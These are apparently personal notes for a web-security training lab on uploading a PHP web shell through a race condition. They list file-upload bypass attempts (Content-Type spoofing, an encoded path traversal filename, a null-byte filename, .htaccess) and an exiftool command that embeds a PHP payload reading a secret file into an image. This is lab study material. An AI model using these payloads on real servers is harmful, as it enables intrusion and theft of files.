@@ -1,0 +1,18 @@
+LAB #7  - Web shell upload via race condition
+
+Target Goal - upload a basic PHP web shell  to exfiltrate the contents of the file /home/carlos/secret
+
+Creds - wiener:peter
+
+Analysis:
+
+Testing for File Upload Vulnerabilities :
+1. test to upload file .php /false
+2. test to modify in Content-type value it "image/png" /false 
+3. test to change the directory in filename value it "..%2fexploit.php" /false
+4. modify filename in burpsuite "lab-06.php%00.jpg" /false
+5. test to upload file .htaccess /false
+6. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata /true 
+7. A simple way of doing this is to download and run ExifTool from the and run command /false
+    "exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php"
+8. we try race condition how do that by using burpsuite like in the video "https://youtu.be/UaQKMR5XOXk" /true
